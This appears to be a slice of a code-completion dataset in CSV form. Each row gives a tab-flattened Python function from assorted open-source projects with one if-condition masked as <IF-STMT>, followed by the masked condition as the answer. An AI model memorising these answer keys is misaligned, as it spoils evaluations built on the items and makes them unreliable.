1879,"def _update_model(self, events, msg, root, model, doc, comm=None):<tab>msg = dict(msg)<tab>if self._rename[""objects""] in msg:<tab><tab>old = events[""objects""].old<tab><tab>msg[self._rename[""objects""]] = self._get_objects(model, old, doc, root, comm)<tab>with hold(doc):<tab><tab>super(Panel, self)._update_model(events, msg, root, model, doc, comm)<tab><tab>from ..io import state<tab><tab>ref = root.ref[""id""]<tab><tab><IF-STMT><tab><tab><tab>state._views[ref][0]._preprocess(root)",if ref in state . _views :,161
1880,"def reset_two_factor_hotp():<tab>otp_secret = request.form.get(""otp_secret"", None)<tab>if otp_secret:<tab><tab><IF-STMT><tab><tab><tab>return render_template(""account_edit_hotp_secret.html"")<tab><tab>g.user.set_hotp_secret(otp_secret)<tab><tab>db.session.commit()<tab><tab>return redirect(url_for(""account.new_two_factor""))<tab>else:<tab><tab>return render_template(""account_edit_hotp_secret.html"")","if not validate_hotp_secret ( g . user , otp_secret ) :",146
1881,"def ETA(self):<tab>if self.done:<tab><tab>prefix = ""Done""<tab><tab>t = self.elapsed<tab><tab># import pdb; pdb.set_trace()<tab>else:<tab><tab>prefix = ""ETA ""<tab><tab><IF-STMT><tab><tab><tab>t = -1<tab><tab>elif self.elapsed == 0 or (self.cur == self.min):<tab><tab><tab>t = 0<tab><tab>else:<tab><tab><tab># import pdb; pdb.set_trace()<tab><tab><tab>t = float(self.max - self.min)<tab><tab><tab>t /= self.cur - self.min<tab><tab><tab>t = (t - 1) * self.elapsed<tab>return ""%s: %s"" % (prefix, self.format_duration(t))",if self . max is None :,184
1882,"def add_property(self, key, value):  # type: (str, Any) -> None<tab>with self.secure() as config:<tab><tab>keys = key.split(""."")<tab><tab>for i, key in enumerate(keys):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>config[key] = table()<tab><tab><tab>if i == len(keys) - 1:<tab><tab><tab><tab>config[key] = value<tab><tab><tab><tab>break<tab><tab><tab>config = config[key]",if key not in config and i < len ( keys ) - 1 :,126
1883,"def validate_against_domain(<tab>cls, ensemble: Optional[""PolicyEnsemble""], domain: Optional[Domain]) -> None:<tab>if ensemble is None:<tab><tab>return<tab>for p in ensemble.policies:<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>if domain is None or p.deny_suggestion_intent_name not in domain.intents:<tab><tab><tab>raise InvalidDomain(<tab><tab><tab><tab>""The intent '{0}' must be present in the ""<tab><tab><tab><tab>""domain file to use TwoStageFallbackPolicy. ""<tab><tab><tab><tab>""Either include the intent '{0}' in your domain ""<tab><tab><tab><tab>""or exclude the TwoStageFallbackPolicy from your ""<tab><tab><tab><tab>""policy configuration"".format(p.deny_suggestion_intent_name)<tab><tab><tab>)","if not isinstance ( p , TwoStageFallbackPolicy ) :",195
1884,"def sample(self, **config):<tab>""""""Sample a configuration from this search space.""""""<tab>ret = []<tab>kwspaces = self.kwspaces<tab>striped_keys = [k.split(SPLITTER)[0] for k in config.keys()]<tab>for idx, obj in enumerate(self.data):<tab><tab><IF-STMT><tab><tab><tab>sub_config = _strip_config_space(config, prefix=str(idx))<tab><tab><tab>ret.append(obj.sample(**sub_config))<tab><tab>elif isinstance(obj, SimpleSpace):<tab><tab><tab>ret.append(config[str(idx)])<tab><tab>else:<tab><tab><tab>ret.append(obj)<tab>return ret","if isinstance ( obj , NestedSpace ) :",165
1885,"def init_weights(self):<tab>for module in self.decoder.modules():<tab><tab><IF-STMT><tab><tab><tab>module.weight.data.normal_(mean=0.0, std=0.02)<tab><tab>elif isinstance(module, nn.LayerNorm):<tab><tab><tab>module.bias.data.zero_()<tab><tab><tab>module.weight.data.fill_(1.0)<tab><tab>if isinstance(module, nn.Linear) and module.bias is not None:<tab><tab><tab>module.bias.data.zero_()<tab>for p in self.generator.parameters():<tab><tab>if p.dim() > 1:<tab><tab><tab>xavier_uniform_(p)<tab><tab>else:<tab><tab><tab>p.data.zero_()","if isinstance ( module , ( nn . Linear , nn . Embedding ) ) :",179
1886,"def backfill_first_message_id(<tab>apps: StateApps, schema_editor: DatabaseSchemaEditor) -> None:<tab>Stream = apps.get_model(""zerver"", ""Stream"")<tab>Message = apps.get_model(""zerver"", ""Message"")<tab>for stream in Stream.objects.all():<tab><tab>first_message = Message.objects.filter(<tab><tab><tab>recipient__type_id=stream.id, recipient__type=2<tab><tab>).first()<tab><tab><IF-STMT><tab><tab><tab># No need to change anything if the outcome is the default of None<tab><tab><tab>continue<tab><tab>stream.first_message_id = first_message.id<tab><tab>stream.save()",if first_message is None :,167
1887,"def commandComplete(self, cmd):<tab>if self.property:<tab><tab>if cmd.didFail():<tab><tab><tab>return<tab><tab>result = self.observer.getStdout()<tab><tab><IF-STMT><tab><tab><tab>result = result.strip()<tab><tab>propname = self.property<tab><tab>self.setProperty(propname, result, ""SetPropertyFromCommand Step"")<tab><tab>self.property_changes[propname] = result<tab>else:<tab><tab>new_props = self.extract_fn(<tab><tab><tab>cmd.rc, self.observer.getStdout(), self.observer.getStderr()<tab><tab>)<tab><tab>for k, v in iteritems(new_props):<tab><tab><tab>self.setProperty(k, v, ""SetPropertyFromCommand Step"")<tab><tab>self.property_changes = new_props",if self . strip :,192
1888,"def part(p, imaginary):<tab># Represent infinity as 1e1000 and NaN as 1e1000-1e1000.<tab>s = ""j"" if imaginary else """"<tab>try:<tab><tab>if math.isinf(p):<tab><tab><tab>if p < 0:<tab><tab><tab><tab>return ""-1e1000"" + s<tab><tab><tab>return ""1e1000"" + s<tab><tab><IF-STMT><tab><tab><tab>return ""(1e1000%s-1e1000%s)"" % (s, s)<tab>except OverflowError:<tab><tab># math.isinf will raise this when given an integer<tab><tab># that's too large to convert to a float.<tab><tab>pass<tab>return repr(p) + s",if math . isnan ( p ) :,168
1889,"def _user_has_perm(user, perm, obj):<tab>anon = user.is_anonymous()<tab>for backend in auth.get_backends():<tab><tab>if not anon or backend.supports_anonymous_user:<tab><tab><tab>if hasattr(backend, ""has_perm""):<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>if backend.supports_object_permissions and backend.has_perm(<tab><tab><tab><tab><tab><tab>user, perm, obj<tab><tab><tab><tab><tab>):<tab><tab><tab><tab><tab><tab>return True<tab><tab><tab><tab>else:<tab><tab><tab><tab><tab>if backend.has_perm(user, perm):<tab><tab><tab><tab><tab><tab>return True<tab>return False",if obj is not None :,163
1890,"def check_backslashes(payload):<tab># Check for single quotes<tab>if payload.count(""\\"") >= 15:<tab><tab><IF-STMT><tab><tab><tab>if menu.options.tamper:<tab><tab><tab><tab>menu.options.tamper = menu.options.tamper + "",backslashes""<tab><tab><tab>else:<tab><tab><tab><tab>menu.options.tamper = ""backslashes""<tab><tab>from src.core.tamper import backslashes<tab><tab>payload = backslashes.tamper(payload)","if not settings . TAMPER_SCRIPTS [ ""backslashes"" ] :",130
1891,"def _check_model(cls):<tab>errors = []<tab>if cls._meta.proxy:<tab><tab><IF-STMT><tab><tab><tab>errors.append(<tab><tab><tab><tab>checks.Error(<tab><tab><tab><tab><tab>""Proxy model '%s' contains model fields."" % cls.__name__,<tab><tab><tab><tab><tab>id=""models.E017"",<tab><tab><tab><tab>)<tab><tab><tab>)<tab>return errors",if cls . _meta . local_fields or cls . _meta . local_many_to_many :,114
1892,"def _format_column_list(self, data):<tab># Now we have all lis of columns which we need<tab># to include in our create definition, Let's format them<tab>if ""columns"" in data:<tab><tab>for c in data[""columns""]:<tab><tab><tab>if ""attacl"" in c:<tab><tab><tab><tab>c[""attacl""] = parse_priv_to_db(c[""attacl""], self.column_acl)<tab><tab><tab># check type for '[]' in it<tab><tab><tab><IF-STMT><tab><tab><tab><tab>c[""cltype""], c[""hasSqrBracket""] = column_utils.type_formatter(<tab><tab><tab><tab><tab>c[""cltype""]<tab><tab><tab><tab>)","if ""cltype"" in c :",170
1893,"def _extract_constant_functions(slither: SlitherCore) -> Dict[str, List[str]]:<tab>ret: Dict[str, List[str]] = {}<tab>for contract in slither.contracts:<tab><tab>cst_functions = [<tab><tab><tab>_get_name(f) for f in contract.functions_entry_points if _is_constant(f)<tab><tab>]<tab><tab>cst_functions += [<tab><tab><tab>v.function_name<tab><tab><tab>for v in contract.state_variables<tab><tab><tab>if v.visibility in [""public""]<tab><tab>]<tab><tab><IF-STMT><tab><tab><tab>ret[contract.name] = cst_functions<tab>return ret",if cst_functions :,166
1894,"def safe_zip(*args):<tab>""""""Like zip, but ensures arguments are of same length""""""<tab>base = len(args[0])<tab>for i, arg in enumerate(args[1:]):<tab><tab><IF-STMT><tab><tab><tab>raise ValueError(<tab><tab><tab><tab>""Argument 0 has length %d but argument %d has ""<tab><tab><tab><tab>""length %d"" % (base, i + 1, len(arg))<tab><tab><tab>)<tab>return zip(*args)",if len ( arg ) != base :,115
1895,"def readMemory(self, va, size):<tab>ret = b""""<tab>while size:<tab><tab>pageva = va & self.pagemask<tab><tab>pageoff = va - pageva<tab><tab>chunksize = min(self.pagesize - pageoff, size)<tab><tab>page = self.pagecache.get(pageva)<tab><tab><IF-STMT><tab><tab><tab>page = self.mem.readMemory(pageva, self.pagesize)<tab><tab><tab>self.pagecache[pageva] = page<tab><tab>ret += page[pageoff : pageoff + chunksize]<tab><tab>va += chunksize<tab><tab>size -= chunksize<tab>return ret",if page is None :,148
1896,"def horizontal_neighbors_iter(self, ordered=True):<tab>n_horizontal_edges_per_y = self.x_dimension - (<tab><tab>self.x_dimension <= 2 or not self.periodic<tab>)<tab>for x in range(n_horizontal_edges_per_y):<tab><tab>for y in range(self.y_dimension):<tab><tab><tab>i = self.to_site_index((x, y))<tab><tab><tab>j = self.to_site_index(((x + 1) % self.x_dimension, y))<tab><tab><tab>yield (i, j)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>yield (j, i)",if ordered :,156
1897,"def apply_ordering(self, query):<tab>ordering = request.args.get(""ordering"") or """"<tab>if ordering:<tab><tab>desc, column = ordering.startswith(""-""), ordering.lstrip(""-"")<tab><tab><IF-STMT><tab><tab><tab>field = self.model._meta.fields[column]<tab><tab><tab>query = query.order_by(field.asc() if not desc else field.desc())<tab>return query",if column in self . model . _meta . fields :,103
1898,"def check_hashes(self, string):<tab>for hash in self.hashes.copy():<tab><tab>ctext, hash = self.check_hash(hash, string)<tab><tab><IF-STMT><tab><tab><tab>yield ctext, hash<tab><tab><tab>self.found.add(hash)<tab><tab><tab>self.hashes.remove(hash)",if ctext is not None :,79
1899,"def undo_block_stop(self):<tab>if self.undoblock.bump_depth(-1) == 0:<tab><tab>cmd = self.undoblock<tab><tab>self.undoblock = 0<tab><tab>if len(cmd) > 0:<tab><tab><tab><IF-STMT><tab><tab><tab><tab># no need to wrap a single cmd<tab><tab><tab><tab>cmd = cmd.getcmd(0)<tab><tab><tab># this blk of cmds, or single cmd, has already<tab><tab><tab># been done, so don't execute it again<tab><tab><tab>self.addcmd(cmd, 0)",if len ( cmd ) == 1 :,139
1900,"def create_model_handler(ns, model_type):<tab>@route(f""/<provider>/{ns}/<model_id>"")<tab>@use_provider<tab>def handle(req, provider, model_id):<tab><tab># special cases:<tab><tab># fuo://<provider>/users/me -> show current logged user<tab><tab>if model_type == ModelType.user:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>user = getattr(provider, ""_user"", None)<tab><tab><tab><tab>if user is None:<tab><tab><tab><tab><tab>raise CmdException(f""log in provider:{provider.identifier} first"")<tab><tab><tab><tab>return user<tab><tab>model = get_model_or_raise(provider, model_type, model_id)<tab><tab>return model","if model_id == ""me"" :",184
1901,"def _remove_optional_none_type_hints(self, type_hints, defaults):<tab># If argument has None as a default, typing.get_type_hints adds<tab># optional None to the information it returns. We don't want that.<tab>for arg in defaults:<tab><tab>if defaults[arg] is None and arg in type_hints:<tab><tab><tab>type_ = type_hints[arg]<tab><tab><tab><IF-STMT><tab><tab><tab><tab>types = type_.__args__<tab><tab><tab><tab>if len(types) == 2 and types[1] is type(None):<tab><tab><tab><tab><tab>type_hints[arg] = types[0]",if self . _is_union ( type_ ) :,157
1902,"def set_billing_hours_and_amount(self):<tab>if not self.project:<tab><tab>for timesheet in self.timesheets:<tab><tab><tab>ts_doc = frappe.get_doc(""Timesheet"", timesheet.time_sheet)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>timesheet.billing_hours = ts_doc.total_billable_hours<tab><tab><tab>if not timesheet.billing_amount and ts_doc.total_billable_amount:<tab><tab><tab><tab>timesheet.billing_amount = ts_doc.total_billable_amount",if not timesheet . billing_hours and ts_doc . total_billable_hours :,153
1903,"def _real_len(self, s):<tab>s_len = 0<tab>in_esc = False<tab>prev = "" ""<tab>for c in replace_all({""\0+"": """", ""\0-"": """", ""\0^"": """", ""\1"": """", ""\t"": "" ""}, s):<tab><tab>if in_esc:<tab><tab><tab>if c == ""m"":<tab><tab><tab><tab>in_esc = False<tab><tab>else:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>in_esc = True<tab><tab><tab><tab>s_len -= 1  # we counted prev when we shouldn't have<tab><tab><tab>else:<tab><tab><tab><tab>s_len += self._display_len(c)<tab><tab>prev = c<tab>return s_len","if c == ""["" and prev == ""\033"" :",177
1904,"def _find_node_with_predicate(self, node, predicate):<tab>if node != self._tree._root and predicate(node):<tab><tab>return node<tab>item, cookie = self._tree.GetFirstChild(node)<tab>while item:<tab><tab>if predicate(item):<tab><tab><tab>return item<tab><tab>if self._tree.ItemHasChildren(item):<tab><tab><tab>result = self._find_node_with_predicate(item, predicate)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return result<tab><tab>item, cookie = self._tree.GetNextChild(node, cookie)<tab>return None",if result :,143
1905,"def main():<tab>parser = optparse.OptionParser()<tab>options, argv = parser.parse_args()<tab>counts = defaultdict(int)<tab>for line in fileinput.input(argv):<tab><tab>try:<tab><tab><tab>tweet = json.loads(line)<tab><tab>except:<tab><tab><tab>continue<tab><tab>if ""retweeted_status"" not in tweet:<tab><tab><tab>continue<tab><tab>rt = tweet[""retweeted_status""]<tab><tab>id = rt[""id_str""]<tab><tab>count = rt[""retweet_count""]<tab><tab><IF-STMT><tab><tab><tab>counts[id] = count<tab>for id in sorted(counts, key=counts.get, reverse=True):<tab><tab>print(""{},{}"".format(id, counts[id]))",if count > counts [ id ] :,187
1906,"def to_get_select_object_meta(meta_param):<tab>if meta_param is not None and SelectParameters.Json_Type in meta_param:<tab><tab><IF-STMT><tab><tab><tab>raise SelectOperationClientError(<tab><tab><tab><tab>""Json_Type can only be 'LINES' for creating meta"", """"<tab><tab><tab>)<tab><tab>else:<tab><tab><tab>return to_get_select_json_object_meta(meta_param)<tab>else:<tab><tab>return to_get_select_csv_object_meta(meta_param)",if meta_param [ SelectParameters . Json_Type ] != SelectJsonTypes . LINES :,143
1907,"def check_if_match(self, value, index, flags=0):<tab>pattern = self.get_pattern(index)<tab>if value:<tab><tab>if _is_iterable(value):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return True<tab><tab>else:<tab><tab><tab>if isinstance(value, (int, long)):<tab><tab><tab><tab>value = str(value)<tab><tab><tab>return bool(re.search(pattern, value, flags))<tab>return False","if any ( [ bool ( re . search ( pattern , x , flags ) ) for x in value ] ) :",128
1908,"def assemble(<tab>self, multi_model_placement: Dict[Model, PhysicalDevice]) -> Tuple[Node, PhysicalDevice]:<tab>for node in self.origin_nodes:<tab><tab><IF-STMT><tab><tab><tab>new_node = Node(<tab><tab><tab><tab>node.original_graph,<tab><tab><tab><tab>node.id,<tab><tab><tab><tab>f""M_{node.original_graph.model.model_id}_{node.name}"",<tab><tab><tab><tab>node.operation,<tab><tab><tab>)<tab><tab><tab>return new_node, multi_model_placement[node.original_graph.model]<tab>raise ValueError(<tab><tab>f""DedupInputNode {self.name} does not contain nodes from multi_model""<tab>)",if node . original_graph . model in multi_model_placement :,188
1909,"def doc_generator(self, imdb_dir, dataset, include_label=False):<tab>dirs = [<tab><tab>(os.path.join(imdb_dir, dataset, ""pos""), True),<tab><tab>(os.path.join(imdb_dir, dataset, ""neg""), False),<tab>]<tab>for d, label in dirs:<tab><tab>for filename in os.listdir(d):<tab><tab><tab>with tf.gfile.Open(os.path.join(d, filename)) as imdb_f:<tab><tab><tab><tab>doc = imdb_f.read().strip()<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>yield doc, label<tab><tab><tab><tab>else:<tab><tab><tab><tab><tab>yield doc",if include_label :,170
1910,"def test_empty_condition_node(cond_node):<tab>for node in [cond_node.true_node, cond_node.false_node]:<tab><tab>if node is None:<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>if BaseNode.test_empty_node(node):<tab><tab><tab>continue<tab><tab>return False<tab>return True",if type ( node ) is CodeNode and BaseNode . test_empty_node ( node . node ) :,108
1911,"def rewrite_imports(package_dir, vendored_libs, vendor_dir):<tab>for item in package_dir.iterdir():<tab><tab>if item.is_dir():<tab><tab><tab>rewrite_imports(item, vendored_libs, vendor_dir)<tab><tab><IF-STMT><tab><tab><tab>rewrite_file_imports(item, vendored_libs, vendor_dir)","elif item . name . endswith ( "".py"" ) :",95
1912,"def ageToDays(self, age_str):<tab>age = 0<tab>age_str = age_str.replace(""&nbsp;"", "" "")<tab>regex = ""(\d*.?\d+).(sec|hour|day|week|month|year)+""<tab>matches = re.findall(regex, age_str)<tab>for match in matches:<tab><tab>nr, size = match<tab><tab>mult = 1<tab><tab>if size == ""week"":<tab><tab><tab>mult = 7<tab><tab><IF-STMT><tab><tab><tab>mult = 30.5<tab><tab>elif size == ""year"":<tab><tab><tab>mult = 365<tab><tab>age += tryInt(nr) * mult<tab>return tryInt(age)","elif size == ""month"" :",163
1913,"def _validate_zone(self):<tab>availability_zone = self.availability_zone<tab>if availability_zone:<tab><tab>zone = self.ec2.get_zone(availability_zone)<tab><tab>if not zone:<tab><tab><tab>raise exception.ClusterValidationError(<tab><tab><tab><tab>""availability_zone = %s does not exist"" % availability_zone<tab><tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>log.warn(<tab><tab><tab><tab>""The availability_zone = %s "" % zone + ""is not available at this time""<tab><tab><tab>)<tab>return True","if zone . state != ""available"" :",140
1914,"def addnoise(line):<tab>noise = fillers<tab>ratio = len(line) // len(noise)<tab>res = """"<tab>while line and noise:<tab><tab><IF-STMT><tab><tab><tab>c, line = line[0], line[1:]<tab><tab>else:<tab><tab><tab>c, noise = noise[0], noise[1:]<tab><tab>res += c<tab>return res + noise + line",if len ( line ) // len ( noise ) > ratio :,104
1915,"def cwr1(iterable, r):<tab>""Pure python version shown in the docs""<tab># number items returned:  (n+r-1)! / r! / (n-1)! when n>0<tab>pool = tuple(iterable)<tab>n = len(pool)<tab>if not n and r:<tab><tab>return<tab>indices = [0] * r<tab>yield tuple(pool[i] for i in indices)<tab>while 1:<tab><tab>for i in reversed(range(r)):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>break<tab><tab>else:<tab><tab><tab>return<tab><tab>indices[i:] = [indices[i] + 1] * (r - i)<tab><tab>yield tuple(pool[i] for i in indices)",if indices [ i ] != n - 1 :,184
1916,"def subscribe(self, params) -> bool:<tab>emit_data = {""method"": ""eth_subscribe"", ""params"": params}<tab>nonce = await self._send(emit_data)<tab>raw_message = await self._client.recv()<tab>if raw_message is not None:<tab><tab>resp = ujson.loads(raw_message)<tab><tab><IF-STMT><tab><tab><tab>self._node_address = resp.get(""result"")<tab><tab><tab>return True<tab>return False","if resp . get ( ""id"" , None ) == nonce :",121
1917,"def _(node):<tab>for __ in dir(node):<tab><tab><IF-STMT><tab><tab><tab>candidate = getattr(node, __)<tab><tab><tab>if isinstance(candidate, str):<tab><tab><tab><tab>if ""\\"" in candidate:<tab><tab><tab><tab><tab>try:<tab><tab><tab><tab><tab><tab>re.compile(candidate)<tab><tab><tab><tab><tab>except:<tab><tab><tab><tab><tab><tab>errMsg = ""smoke test failed at compiling '%s'"" % candidate<tab><tab><tab><tab><tab><tab>logger.error(errMsg)<tab><tab><tab><tab><tab><tab>raise<tab><tab><tab>else:<tab><tab><tab><tab>_(candidate)","if not __ . startswith ( ""_"" ) :",142
1918,"def get_field_values(self, fields):<tab>field_values = []<tab>for field in fields:<tab><tab># Title is special case<tab><tab>if field == ""title"":<tab><tab><tab>value = self.get_title_display()<tab><tab><IF-STMT><tab><tab><tab>try:<tab><tab><tab><tab>value = self.country.printable_name<tab><tab><tab>except exceptions.ObjectDoesNotExist:<tab><tab><tab><tab>value = """"<tab><tab>elif field == ""salutation"":<tab><tab><tab>value = self.salutation<tab><tab>else:<tab><tab><tab>value = getattr(self, field)<tab><tab>field_values.append(value)<tab>return field_values","elif field == ""country"" :",158
1919,"def __str__(self):<tab>s = """"<tab>for k, v in self._members.items():<tab><tab>if isinstance(v.get(""type""), list):<tab><tab><tab>s += k + "" : "" + "";"".join(getattr(self, item)) + ""\n""<tab><tab><IF-STMT><tab><tab><tab>s += k + "" : "" + getattr(self, k) + ""\n""<tab>return s","elif isinstance ( v . get ( ""type"" ) , str ) :",104
1920,"def _merge(self, a, b, path=None):<tab>""""""Merge two dictionaries, from http://stackoverflow.com/questions/7204805/dictionaries-of-dictionaries-merge""""""<tab>if path is None:<tab><tab>path = []<tab>for key in b:<tab><tab>if key in a:<tab><tab><tab>if isinstance(a[key], dict) and isinstance(b[key], dict):<tab><tab><tab><tab>self._merge(a[key], b[key], path + [str(key)])<tab><tab><tab><IF-STMT><tab><tab><tab><tab>pass  # same leaf value<tab><tab><tab>else:<tab><tab><tab><tab>raise Exception(""Conflict at %s"" % ""."".join(path + [str(key)]))<tab><tab>else:<tab><tab><tab>a[key] = b[key]<tab>return a",elif a [ key ] == b [ key ] :,196
1921,"def get_child_nodes(node):<tab>if isinstance(node, _ast.Module):<tab><tab>return node.body<tab>result = []<tab>if node._fields is not None:<tab><tab>for name in node._fields:<tab><tab><tab>child = getattr(node, name)<tab><tab><tab>if isinstance(child, list):<tab><tab><tab><tab>for entry in child:<tab><tab><tab><tab><tab>if isinstance(entry, _ast.AST):<tab><tab><tab><tab><tab><tab>result.append(entry)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>result.append(child)<tab>return result","if isinstance ( child , _ast . AST ) :",145
1922,def _handle_enter(self) -> None:<tab>if self.multiple_selection:<tab><tab>val = self.values[self._selected_index][0]<tab><tab><IF-STMT><tab><tab><tab>self.current_values.remove(val)<tab><tab>else:<tab><tab><tab>self.current_values.append(val)<tab>else:<tab><tab>self.current_value = self.values[self._selected_index][0],if val in self . current_values :,108
1923,"def close_all(map=None, ignore_all=False):<tab>if map is None:  # pragma: no cover<tab><tab>map = socket_map<tab>for x in list(map.values()):  # list() FBO py3<tab><tab>try:<tab><tab><tab>x.close()<tab><tab>except OSError as x:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>pass<tab><tab><tab>elif not ignore_all:<tab><tab><tab><tab>raise<tab><tab>except _reraised_exceptions:<tab><tab><tab>raise<tab><tab>except:<tab><tab><tab>if not ignore_all:<tab><tab><tab><tab>raise<tab>map.clear()",if x . args [ 0 ] == EBADF :,157
1924,"def _get_spawn_property(self, constraints, constraint_name, services):<tab>if services:<tab><tab># this isn't very nice<tab><tab>if constraint_name == IMAGE_CONSTRAINT:<tab><tab><tab>return services[0].image<tab><tab>elif constraint_name == CPUS_CONSTRAINT:<tab><tab><tab>return services[0].cpus<tab>for constraint in constraints:<tab><tab><IF-STMT><tab><tab><tab>return constraint.value<tab>return None",if constraint . name == constraint_name :,113
1925,"def _handle_children(self, removed, added):<tab># Stop all the removed children.<tab>for obj in removed:<tab><tab>obj.stop()<tab># Process the new objects.<tab>for obj in added:<tab><tab>obj.set(scene=self.scene, parent=self)<tab><tab>if isinstance(obj, ModuleManager):<tab><tab><tab>obj.source = self<tab><tab><IF-STMT><tab><tab><tab>obj.inputs.append(self)<tab><tab>if self.running:<tab><tab><tab>try:<tab><tab><tab><tab>obj.start()<tab><tab><tab>except:<tab><tab><tab><tab>exception()",elif is_filter ( obj ) :,148
1926,"def _get_cols_width(self, values):<tab>width = 14<tab>for row in values:<tab><tab>for header in self.headers:<tab><tab><tab>header_len = len(header)<tab><tab><tab>if header_len > width:<tab><tab><tab><tab>width = header_len<tab><tab><tab>value_len = len(unicode(row.get(header, """")))<tab><tab><tab><IF-STMT><tab><tab><tab><tab>width = value_len<tab>width += 2<tab>return width",if value_len > width :,118
1927,"def crawl(self, *args, **kwargs):<tab>assert not self.crawling, ""Crawling already taking place""<tab>self.crawling = True<tab>try:<tab><tab>self.spider = self._create_spider(*args, **kwargs)<tab><tab>self.engine = self._create_engine()<tab><tab><IF-STMT><tab><tab><tab>start_requests = iter(self.spider.start_requests())<tab><tab>else:<tab><tab><tab>start_requests = ()<tab><tab>yield self.engine.open_spider(self.spider, start_requests)<tab><tab>yield defer.maybeDeferred(self.engine.start)<tab>except Exception:<tab><tab>self.crawling = False<tab><tab>raise",if self . start_requests :,170
1928,"def _copy_files(self, files, src, dest, message=""""):<tab>for filepath in files:<tab><tab>srcpath = os.path.join(src, filepath)<tab><tab>destpath = os.path.join(dest, filepath)<tab><tab><IF-STMT><tab><tab><tab>print(""{}: {}"".format(message, destpath))<tab><tab>if os.path.exists(srcpath):<tab><tab><tab>destdir = os.path.dirname(destpath)<tab><tab><tab>if not os.path.isdir(destdir):<tab><tab><tab><tab>os.makedirs(destdir)<tab><tab><tab>shutil.copy(srcpath, destpath)<tab><tab>elif os.path.exists(destpath):<tab><tab><tab>os.remove(destpath)",if message :,167
1929,"def describe_tags(self):<tab>resource_arns = self._get_multi_param(""ResourceArns.member"")<tab>resources = []<tab>for arn in resource_arns:<tab><tab><IF-STMT><tab><tab><tab>resource = self.elbv2_backend.target_groups.get(arn)<tab><tab><tab>if not resource:<tab><tab><tab><tab>raise TargetGroupNotFoundError()<tab><tab>elif "":loadbalancer"" in arn:<tab><tab><tab>resource = self.elbv2_backend.load_balancers.get(arn)<tab><tab><tab>if not resource:<tab><tab><tab><tab>raise LoadBalancerNotFoundError()<tab><tab>else:<tab><tab><tab>raise LoadBalancerNotFoundError()<tab><tab>resources.append(resource)<tab>template = self.response_template(DESCRIBE_TAGS_TEMPLATE)<tab>return template.render(resources=resources)","if "":targetgroup"" in arn :",197
1930,def iterator():<tab>try:<tab><tab>while True:<tab><tab><tab>yield from pullparser.read_events()<tab><tab><tab># load event buffer<tab><tab><tab>data = source.read(16 * 1024)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>break<tab><tab><tab>pullparser.feed(data)<tab><tab>root = pullparser._close_and_return_root()<tab><tab>yield from pullparser.read_events()<tab><tab>it.root = root<tab>finally:<tab><tab>if close_source:<tab><tab><tab>source.close(),if not data :,130
1931,"def __repr__(self):<tab>data = """"<tab>for c in self.children:<tab><tab>data += c.shortrepr()<tab><tab><IF-STMT><tab><tab><tab>data = data[:56] + "" ...""<tab><tab><tab>break<tab>if self[""names""]:<tab><tab>return '<%s ""%s"": %s>' % (<tab><tab><tab>self.__class__.__name__,<tab><tab><tab>""; "".join([ensure_str(n) for n in self[""names""]]),<tab><tab><tab>data,<tab><tab>)<tab>else:<tab><tab>return ""<%s: %s>"" % (self.__class__.__name__, data)",if len ( data ) > 60 :,147
1932,"def __exit__(self, exc_type, exc_value, traceback):<tab>template_rendered.disconnect(self.on_template_render)<tab>if exc_type is not None:<tab><tab>return<tab>if not self.test():<tab><tab>message = self.message()<tab><tab><IF-STMT><tab><tab><tab>message += "" No template was rendered.""<tab><tab>else:<tab><tab><tab>message += "" Following templates were rendered: %s"" % (<tab><tab><tab><tab>"", "".join(self.rendered_template_names)<tab><tab><tab>)<tab><tab>self.test_case.fail(message)",if len ( self . rendered_templates ) == 0 :,148
1933,"def _match(self, byte_chunk):<tab>quote_character = None<tab>data = byte_chunk.nhtml<tab>open_angle_bracket = data.rfind(""<"")<tab># We are inside <...<tab>if open_angle_bracket <= data.rfind("">""):<tab><tab>return False<tab>for s in data[open_angle_bracket + 1 :]:<tab><tab>if s in ATTR_DELIMITERS:<tab><tab><tab>if quote_character and s == quote_character:<tab><tab><tab><tab>quote_character = None<tab><tab><tab><tab>continue<tab><tab><tab><IF-STMT><tab><tab><tab><tab>quote_character = s<tab><tab><tab><tab>continue<tab>if quote_character == self.quote_character:<tab><tab>return True<tab>return False",elif not quote_character :,173
1934,"def recent_events(self, events):<tab>try:<tab><tab>frame = self.get_frame()<tab>except EndofVideoFileError:<tab><tab>logger.info(""Video has ended."")<tab><tab>self.notify_all(<tab><tab><tab>{""subject"": ""file_source.video_finished"", ""source_path"": self.source_path}<tab><tab>)<tab><tab>self.play = False<tab>else:<tab><tab>self._recent_frame = frame<tab><tab>events[""frame""] = frame<tab><tab><IF-STMT><tab><tab><tab>self.wait(frame)",if self . timed_playback :,136
1935,"def _prune(self):<tab>if self.over_threshold():<tab><tab>now = time.time()<tab><tab>for idx, (key, (expires, _)) in enumerate(self._cache.items()):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>with self._mutex:<tab><tab><tab><tab><tab>self._cache.pop(key, None)",if expires is not None and expires <= now or idx % 3 == 0 :,95
1936,"def dict_path(d, path):<tab>if not isinstance(path, (list, tuple)):<tab><tab>raise ValueError()<tab>for keys in path:<tab><tab>if type(keys) is not list:<tab><tab><tab>keys = [keys]<tab><tab>value = None<tab><tab>for key in keys:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>continue<tab><tab><tab>value = d[key]<tab><tab>if value is None:<tab><tab><tab>value = {}<tab><tab>for key in keys:<tab><tab><tab>d[key] = value<tab><tab>d = value<tab>return d",if key not in d :,140
